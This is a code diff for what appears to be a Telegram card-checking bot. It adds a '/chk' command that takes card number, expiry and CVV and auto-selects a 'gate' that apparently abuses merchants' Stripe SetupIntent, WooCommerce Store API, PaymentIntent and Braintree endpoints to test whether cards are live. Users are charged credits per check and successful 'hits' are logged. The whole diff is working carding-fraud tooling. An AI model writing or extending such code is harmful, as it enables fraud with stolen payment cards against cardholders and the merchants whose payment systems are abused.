@@ -107,6 +107,59 @@ async def gate_dispatch(client, message: Message):
         await run_gate(message, gate_name, argline)
 
 
+# --- 5.2 мультигейт: авто-выбор лучшей поверхности + форс через /chk ---
+
+GATE_PRIORITY = ["setupwoo", "storegate", "piconfirm", "braintreenvbv"]
+
+
+def _pick_gate(force: str | None) -> str | None:
+    """Приоритет: живой SetupIntent-донор -> Store API -> PI secret -> VBV."""
+    if force:
+        return force if force in GATES else None
+    for g in GATE_PRIORITY:
+        if g in GATES:
+            return g
+    return None
+
+
+async def _auto_check(message: Message, argline: str):
+    u_id = message.from_user.id
+    db.ensure_user(u_id, message.from_user.username or "")
+    if not db.antispam_ok(u_id):
+        return await message.reply("⏳ too fast — antispam cooldown")
+    parts = argline.split()
+    force = None
+    if parts and parts[0] in GATES:
+        force = parts.pop(0)
+    if len(parts) != 4:
+        return await message.reply("format: /chk [gate] CC MM YY CVV")
+    gate_name = _pick_gate(force)
+    if not gate_name:
+        return await message.reply("no gates loaded")
+    meta = GATES[gate_name]
+    cost = (meta["cost"] if meta["cost"] is not None
+            else config.GATE_COST.get(gate_name, 1))
+    if not db.spend_credit(u_id, gate_name):
+        return await message.reply(f"❌ not enough credits ({cost}/check)")
+    status_msg = await message.reply(f"[/chk → {gate_name}] checking...")
+    try:
+        verdict, detail = await meta["fn"](*parts)
+    except Exception as e:
+        verdict, detail = "ERROR", f"{type(e).__name__}: {e}"[:180]
+    if verdict in HIT_VERDICTS:
+        db.add_hit(u_id)
+    icon = {"ERROR": "⚠️", "INVALID": "❌", "RETRY": "⏳"}.get(verdict, "💳")
+    await status_msg.edit_text(
+        f"{icon} <b>[{verdict}]</b> via {gate_name}\ncard: <code>{' '.join(parts)}</code>\n{detail}",
+        parse_mode=ParseMode.HTML)
+
+
+@app.on_message(filters.command(["chk"]))
+async def cmd_chk(client, message: Message):
+    argline = " ".join((message.text or "").split()[1:])
+    await _auto_check(message, argline)
+
+
 # --- admin ---
 
 @app.on_message(filters.command(["addcredits"]))
